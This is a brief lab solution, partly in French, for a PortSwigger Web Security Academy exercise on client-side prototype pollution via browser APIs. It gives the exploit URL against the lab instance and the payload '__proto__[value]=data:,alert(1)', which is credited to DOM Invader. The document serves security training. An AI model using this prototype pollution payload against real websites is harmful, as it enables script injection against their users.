# Lab

https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis

## Solution

`https://0a6e00b003df5345832fc392003d0059.web-security-academy.net/?__proto__[value]=data%3A%2Calert%281%29`

Payload : `__proto__[value]=data:,alert(1)`

Trouvé via DOM Invader